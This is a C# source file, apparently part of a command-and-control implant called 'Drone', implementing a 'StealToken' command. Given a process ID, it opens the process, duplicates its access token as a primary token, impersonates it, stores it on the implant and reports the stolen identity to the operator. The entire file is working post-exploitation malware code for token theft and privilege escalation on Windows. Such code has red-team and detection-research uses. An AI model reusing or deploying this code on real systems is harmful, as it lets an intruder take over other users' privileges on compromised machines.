using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Commands;

public sealed class StealToken : DroneCommand
{
    public override byte Command => 0x15;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        // open target process
        var pid = uint.Parse(task.Arguments[0]);
        
        var hProcess = Native.NtOpenProcess(
            pid,
            (uint)Win32.PROCESS_ACCESS_FLAGS.PROCESS_QUERY_INFORMATION);

        if (hProcess == IntPtr.Zero)
        {
            await Drone.SendError(task, "Failed to open process handle.");
            return;
        }

        // open process token
        var hToken = Win32.OpenProcessToken(
            hProcess,
            Win32.TOKEN_ACCESS.TOKEN_QUERY | Win32.TOKEN_ACCESS.TOKEN_DUPLICATE |
            Win32.TOKEN_ACCESS.TOKEN_ASSIGN_PRIMARY);

        if (hToken == IntPtr.Zero)
        {
            Win32.CloseHandle(hProcess);
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        // duplicate token
        var hTokenDup = Win32.DuplicateTokenEx(
            hToken,
            DInvoke.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
            Win32.SECURITY_IMPERSONATION_LEVEL.SECURITY_IMPERSONATION,
            Win32.TOKEN_TYPE.TOKEN_PRIMARY);

        Win32.CloseHandle(hProcess);
        Win32.CloseHandle(hToken);

        if (hTokenDup == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error());
        
        // revert first
        Win32.RevertToSelf();

        // impersonate token
        var success = Win32.ImpersonateToken(hTokenDup);

        if (!success)
            throw new Win32Exception(Marshal.GetLastWin32Error());
            
        using var identity = new WindowsIdentity(hTokenDup);
        await Drone.SendOutput(task, $"Impersonated token for {identity.Name}.");
            
        // set token on drone
        Drone.ImpersonationToken = hTokenDup;
    }
}